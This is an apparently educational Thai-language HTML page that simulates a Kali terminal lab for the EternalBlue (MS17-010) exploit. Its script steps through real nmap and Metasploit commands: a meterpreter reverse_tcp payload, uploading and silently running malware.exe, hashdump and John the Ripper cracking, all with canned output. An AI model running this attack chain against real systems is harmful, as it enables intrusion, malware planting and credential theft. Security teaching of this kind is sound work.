<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>Lab: EternalBlue Exploitation</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">

    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: 'Roboto Mono', monospace; }
        
        /* Terminal Styling */
        .kali-window {
            background-color: #000;
            border: 1px solid #333;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 150, 255, 0.2);
            height: 600px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .kali-header {
            background: linear-gradient(90deg, #333, #1a1a1a);
            padding: 5px 15px;
            font-size: 0.85rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #444;
        }
        .terminal-body {
            flex-grow: 1;
            padding: 15px;
            overflow-y: auto;
            font-size: 0.95rem;
            line-height: 1.4;
        }
        
        /* Text Colors */
        .prompt-root { color: #ff5f56; font-weight: bold; } /* root@kali */
        .prompt-path { color: #00aaff; font-weight: bold; } /* ~ */
        .prompt-msf { color: #fff; text-decoration: underline; } /* msf6 > */
        .cmd-text { color: #fff; }
        .output-text { color: #ccc; }
        .success-text { color: #00ff00; }
        .info-text { color: #00aaff; }
        .warn-text { color: #ffbd2e; }
        .error-text { color: #ff5f56; }

        /* Input Area */
        .input-line { display: flex; align-items: center; margin-top: 5px; }
        .cmd-input {
            background: transparent; border: none; color: #fff; width: 100%; outline: none;
            font-family: 'Roboto Mono', monospace; font-size: 0.95rem; margin-left: 10px;
        }

        /* Sidebar Guide */
        .guide-panel {
            background: #1e1e1e; border-left: 1px solid #333; height: 600px; overflow-y: auto;
        }
        .step-item {
            padding: 15px; border-bottom: 1px solid #333; transition: 0.3s;
            opacity: 0.5;
        }
        .step-item.active {
            background: #252526; opacity: 1; border-left: 4px solid #00aaff;
        }
        .step-title { font-weight: bold; color: #fff; margin-bottom: 5px; }
        .step-cmd { 
            background: #000; color: #00ff00; padding: 5px 10px; border-radius: 4px; 
            font-size: 0.8rem; display: block; margin-top: 5px; cursor: pointer;
        }
        .step-cmd:hover { background: #333; }

    </style>
</head>
<body>

    <div class="container-fluid mt-4 pb-5">
        <div class="row justify-content-center">
            <div class="col-11 d-flex justify-content-between align-items-center mb-3">
                <h4 class="text-info"><i class="bi bi-radioactive"></i> Lab 11: EternalBlue (MS17-010) Walkthrough</h4>
                <a href="/lab" class="btn btn-outline-secondary btn-sm">Exit Lab</a>
            </div>
        </div>

        <div class="row justify-content-center">
            <!-- Left: Terminal -->
            <div class="col-md-8 p-0">
                <div class="kali-window">
                    <div class="kali-header">
                        <span>root@kali: ~</span>
                        <div class="d-flex gap-2">
                            <div style="width:10px; height:10px; background:#ff5f56; border-radius:50%"></div>
                            <div style="width:10px; height:10px; background:#ffbd2e; border-radius:50%"></div>
                            <div style="width:10px; height:10px; background:#27c93f; border-radius:50%"></div>
                        </div>
                    </div>
                    <div class="terminal-body" id="terminal">
                        <div class="info-text">Kali Linux Rolling (2024.1)</div>
                        <div class="output-text">Type commands to interact. Click commands on the right to auto-fill.</div>
                        <br>
                        <!-- Dynamic Content Here -->
                    </div>
                    <div style="padding: 10px; background: #000;">
                        <div class="input-line">
                            <span id="promptLabel" class="prompt-root">root@kali</span><span class="prompt-path">:~#</span>
                            <input type="text" id="cmdInput" class="cmd-input" autocomplete="off" autofocus>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Right: Guide Panel -->
            <div class="col-md-3 p-0">
                <div class="guide-panel" id="guidePanel">
                    <!-- Steps will be generated by JS -->
                </div>
            </div>
        </div>
    </div>

    <script>
        // --- Configuration ---
        const targetIP = "111.111.111.139";
        const attackerIP = "111.111.111.111";

        // --- Scenario Steps ---
        // นี่คือลำดับขั้นตอนตามโจทย์ที่คุณให้มา
        const steps = [
            {
                title: "1. Start Metasploit",
                desc: "เปิดเครื่องมือ Metasploit Framework",
                cmd: "msfconsole",
                validate: (c) => c === "msfconsole",
                output: `
<span class="text-primary">
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkkkkk:   :kkkkkkkkOOOOOOOOO'
  ,OOOOOOOOkkkkkkkkkk: :kkkkkkkkkkOOOOOOOO,
   .xOOOOOOOOkkkkkkkkkkkkkkkkkkOOOOOOOOx.
     .cdkOOOOOOOOOOOOOOOOOOOOOOOOOdkc.
           'cdkOOOOOOOOOOOOOdkc'
</span>
<span class="info-text">Metasploit Framework Loaded.</span>
`
            },
            {
                title: "2. Recon: Ping Sweep",
                desc: "ตรวจสอบว่าเป้าหมายเปิดเครื่องอยู่หรือไม่",
                cmd: `nmap -sP ${targetIP}`,
                validate: (c) => c.includes("nmap") && c.includes("-sP"),
                output: `Starting Nmap 7.94 scan for ${targetIP}<br>Host is up (0.002s latency).<br>MAC Address: 00:0C:29:BD:08:55 (VMware)`
            },
            {
                title: "3. Recon: Port Scan",
                desc: "สแกนหา Port ที่เปิดบริการ (สังเกต Port 445)",
                cmd: `nmap -sS ${targetIP}`,
                validate: (c) => c.includes("nmap") && c.includes("-sS"),
                output: `PORT    STATE SERVICE<br>135/tcp open  msrpc<br>139/tcp open  netbios-ssn<br><span class="success-text">445/tcp open  microsoft-ds</span><br>3389/tcp open ms-wbt-server`
            },
            {
                title: "4. Recon: OS & Vuln Scan",
                desc: "ตรวจสอบ OS และหาช่องโหว่ด้วย Script Engine",
                cmd: `nmap -v ${targetIP} --script vuln -O`,
                validate: (c) => c.includes("nmap") && c.includes("--script") && c.includes("vuln"),
                output: `Running: OS detection and NSE Script<br>OS details: Microsoft Windows 7 SP1<br><span class="error-text">VULNERABLE:</span><br>Smb-vuln-ms17-010 (EternalBlue)<br>State: VULNERABLE`
            },
            {
                title: "5. Search Exploit",
                desc: "ค้นหาโมดูลสำหรับโจมตี MS17-010",
                cmd: "search exploit ms17_010",
                validate: (c) => c.includes("search") && c.includes("ms17_010"),
                output: `Matching Modules<br>================<br>0  exploit/windows/smb/ms17_010_eternalblue  Windows 7/Server 2008 R2 (x64)`
            },
            {
                title: "6. Select Exploit",
                desc: "เลือกใช้งาน Exploit EternalBlue",
                cmd: "use exploit/windows/smb/ms17_010_eternalblue",
                validate: (c) => c.includes("use") && c.includes("eternalblue"),
                output: `<span class="error-text">[*]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp`
            },
            {
                title: "7. Configure Target",
                desc: "ตั้งค่า IP เป้าหมาย (RHOSTS)",
                cmd: `set RHOSTS ${targetIP}`,
                validate: (c) => c.includes("set RHOSTS"),
                output: `RHOSTS => ${targetIP}`
            },
            {
                title: "8. Configure Payload",
                desc: "ตั้งค่า Payload ให้ย้อนกลับมาหาเรา",
                cmd: "set payload windows/x64/meterpreter/reverse_tcp",
                validate: (c) => c.includes("set payload"),
                output: `payload => windows/x64/meterpreter/reverse_tcp`
            },
            {
                title: "9. Launch Attack!",
                desc: "เริ่มการโจมตี (Exploit)",
                cmd: "exploit",
                validate: (c) => c === "exploit" || c === "run",
                output: `[*] Started reverse TCP handler on ${attackerIP}:4444<br>[*] ${targetIP}:445 - Connecting to target...<br><span class="success-text">[+] ${targetIP}:445 - WIN! Exploited successfully.</span><br>[*] Meterpreter session 1 opened.`
            },
            {
                title: "10. Check Privileges",
                desc: "ตรวจสอบสิทธิ์ในเครื่องเหยื่อ (ใน Meterpreter)",
                cmd: "getuid",
                validate: (c) => c === "getuid",
                output: `Server username: <span class="success-text">NT AUTHORITY\\SYSTEM</span>`
            },
            {
                title: "11. Upload Malware",
                desc: "อัปโหลดไฟล์ Malware ขึ้นไปบนเครื่องเหยื่อ",
                cmd: "upload malware.exe",
                validate: (c) => c.includes("upload"),
                output: `[*] uploading  : malware.exe -> malware.exe<br>[*] uploaded   : malware.exe -> malware.exe`
            },
            {
                title: "12. Enter Shell",
                desc: "เข้าสู่หน้าจอ Command Line (CMD) ของเหยื่อ",
                cmd: "shell",
                validate: (c) => c === "shell",
                output: `Process 1234 created.<br>Channel 1 created.<br>Microsoft Windows [Version 6.1.7601]`
            },
            {
                title: "13. Execute Malware",
                desc: "สั่งรันไฟล์ Malware ที่อัปโหลดไป",
                cmd: "malware.exe",
                validate: (c) => c.includes("malware.exe"),
                output: `[+] Malware executed silently.`
            },
            {
                title: "14. Dump Hashes",
                desc: "ออกจาก Shell (Ctrl+C) แล้วขโมยรหัสผ่าน (Hash)",
                cmd: "run post/windows/gather/hashdump",
                validate: (c) => c.includes("hashdump"),
                output: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`
            },
            {
                title: "15. Crack Password",
                desc: "ใช้ John the Ripper แกะรหัสผ่าน (Simulation)",
                cmd: "john --format=NT hash.txt",
                validate: (c) => c.includes("john"),
                output: `<span class="success-text">admin123</span> (Administrator)<br>1 password hash cracked, 0 left`
            }
        ];

        let currentStepIndex = 0;
        let consoleContext = "root"; // root, msf, meterpreter, shell

        // --- Functions ---

        function initLab() {
            renderGuide();
            document.getElementById('cmdInput').focus();
            document.getElementById('cmdInput').addEventListener('keydown', handleInput);
        }

        function renderGuide() {
            const panel = document.getElementById('guidePanel');
            panel.innerHTML = '';
            
            steps.forEach((step, index) => {
                const div = document.createElement('div');
                div.className = `step-item ${index === currentStepIndex ? 'active' : ''}`;
                
                // ถ้านำหน้าไปแล้ว ให้ติ๊กถูก
                const icon = index < currentStepIndex ? '<i class="bi bi-check-circle-fill text-success"></i>' : (index === currentStepIndex ? '<i class="bi bi-arrow-right-circle-fill text-primary"></i>' : '<i class="bi bi-circle"></i>');
                
                div.innerHTML = `
                    <div class="step-title">${icon} ${step.title}</div>
                    <small class="text-muted">${step.desc}</small>
                    <code class="step-cmd" onclick="autoFill('${step.cmd}')">${step.cmd}</code>
                `;
                panel.appendChild(div);
                
                if(index === currentStepIndex) {
                    div.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
            });
        }

        function autoFill(cmd) {
            if(cmd.startsWith("nmap")) cmd = cmd; // Keep full command
            document.getElementById('cmdInput').value = cmd;
            document.getElementById('cmdInput').focus();
        }

        function handleInput(e) {
            if (e.key === 'Enter') {
                const input = document.getElementById('cmdInput');
                const cmd = input.value.trim();
                const terminal = document.getElementById('terminal');
                
                // 1. แสดงคำสั่งที่พิมพ์
                let promptHTML = "";
                if(consoleContext === "root") promptHTML = `<span class="prompt-root">root@kali</span><span class="prompt-path">:~#</span>`;
                else if(consoleContext === "msf") promptHTML = `<span class="prompt-msf">msf6</span> >`;
                else if(consoleContext === "msf-exploit") promptHTML = `<span class="prompt-msf">msf6 exploit(eternalblue)</span> >`;
                else if(consoleContext === "meterpreter") promptHTML = `<span class="prompt-msf">meterpreter</span> >`;
                else if(consoleContext === "shell") promptHTML = `C:\\Windows\\system32>`;

                const line = document.createElement('div');
                line.innerHTML = `${promptHTML} <span class="cmd-text">${cmd}</span>`;
                terminal.appendChild(line);
                input.value = '';

                // 2. ตรวจสอบคำสั่ง
                const currentStep = steps[currentStepIndex];
                
                if (currentStep && currentStep.validate(cmd)) {
                    // ถูกต้อง -> แสดงผลลัพธ์
                    setTimeout(() => {
                        const outDiv = document.createElement('div');
                        outDiv.className = 'output-text mb-3';
                        outDiv.innerHTML = currentStep.output;
                        terminal.appendChild(outDiv);
                        terminal.scrollTop = terminal.scrollHeight;

                        // เปลี่ยน Context ของ Prompt
                        if (currentStep.title.includes("Start Metasploit")) consoleContext = "msf";
                        if (currentStep.title.includes("Select Exploit")) consoleContext = "msf-exploit";
                        if (currentStep.title.includes("Launch Attack")) consoleContext = "meterpreter";
                        if (currentStep.title.includes("Enter Shell")) consoleContext = "shell";
                        if (cmd === "exit" && consoleContext === "shell") consoleContext = "meterpreter";
                        if (currentStep.title.includes("Dump Hashes")) consoleContext = "meterpreter"; // กลับมาจาก shell เพื่อ dump
                        if (currentStep.title.includes("Crack Password")) consoleContext = "root"; // ออกมาแคร็กข้างนอก

                        // ไปขั้นตอนถัดไป
                        if (currentStepIndex < steps.length - 1) {
                            currentStepIndex++;
                            renderGuide();
                        } else {
                            // จบเกม
                            const finishDiv = document.createElement('div');
                            finishDiv.className = 'alert alert-success mt-4';
                            finishDiv.innerHTML = '<h4>🏆 MISSION COMPLETE!</h4><p>คุณได้ทำการเจาะระบบ Windows 7, ฝัง Malware และขโมยรหัสผ่าน Administrator สำเร็จครบถ้วนตามกระบวนการ</p>';
                            terminal.appendChild(finishDiv);

                            // เพิ่มเกร็ดความรู้และคำเตือน
                            const infoDiv = document.createElement('div');
                            infoDiv.className = 'alert alert-warning mt-3 border-warning';
                            infoDiv.style.backgroundColor = '#332701'; // ปรับสีพื้นหลังให้เข้ากับ Dark Mode นิดหน่อย
                            infoDiv.style.color = '#ffda6a';
                            infoDiv.style.borderColor = '#664d03';
                            infoDiv.innerHTML = `
                                <h5><i class="bi bi-shield-exclamation"></i> เกร็ดความรู้: EternalBlue (MS17-010)</h5>
                                <p class="small mb-0">
                                    <strong>ที่มา:</strong> EternalBlue เป็นเครื่องมือเจาะระบบที่พัฒนาโดย NSA และหลุดออกมาโดยกลุ่ม Shadow Brokers ในปี 2017<br>
                                    <strong>ความสำคัญ:</strong> ช่องโหว่นี้ถูกนำไปใช้ในมัลแวร์เรียกค่าไถ่ <strong>"WannaCry"</strong> ที่โจมตีคอมพิวเตอร์ทั่วโลก สร้างความเสียหายมหาศาล<br>
                                    <hr style="border-color: #664d03; margin: 10px 0;">
                                    <strong>⚠️ คำเตือน:</strong> การทดลองนี้มีวัตถุประสงค์เพื่อการศึกษา (Educational Purpose) เท่านั้น การเจาะระบบโดยไม่ได้รับอนุญาตมีความผิดตาม พ.ร.บ. คอมพิวเตอร์
                                </p>
                            `;
                            terminal.appendChild(infoDiv);

                            terminal.scrollTop = terminal.scrollHeight;
                        }
                        
                        updatePrompt();

                    }, 500); // ดีเลย์นิดนึงให้สมจริง

                } else if (cmd === "clear") {
                    terminal.innerHTML = '';
                } else if (cmd === "exit") {
                    // Logic การออก Context
                    if(consoleContext === "shell") {
                        consoleContext = "meterpreter";
                        terminal.innerHTML += `<div class="output-text">Exiting command shell...</div>`;
                    } else if (consoleContext === "meterpreter") {
                        consoleContext = "msf-exploit";
                        terminal.innerHTML += `<div class="output-text">Meterpreter session closed.</div>`;
                    }
                    updatePrompt();
                } else {
                    // ผิด -> แสดง Error
                    const errDiv = document.createElement('div');
                    errDiv.className = 'error-text mb-2';
                    errDiv.innerHTML = `Command not recognized or incorrect step. (Try: ${currentStep.cmd})`;
                    terminal.appendChild(errDiv);
                }
                
                terminal.scrollTop = terminal.scrollHeight;
            }
        }

        function updatePrompt() {
            const label = document.getElementById('promptLabel');
            
            if(consoleContext === "root") {
                label.className = "prompt-root";
                label.innerHTML = "root@kali";
                label.nextElementSibling.innerHTML = ":~#";
            } else if (consoleContext.includes("msf")) {
                label.className = "prompt-msf";
                label.innerHTML = consoleContext === "msf" ? "msf6" : "msf6 exploit(eternalblue)";
                label.nextElementSibling.innerHTML = " >";
            } else if (consoleContext === "meterpreter") {
                label.className = "prompt-msf";
                label.innerHTML = "meterpreter";
                label.nextElementSibling.innerHTML = " >";
            } else if (consoleContext === "shell") {
                label.className = "";
                label.style.color = "#ccc";
                label.innerHTML = "C:\\Windows\\system32";
                label.nextElementSibling.innerHTML = ">";
            }
        }

        // Run
        initLab();

    </script>
</body>
</html>
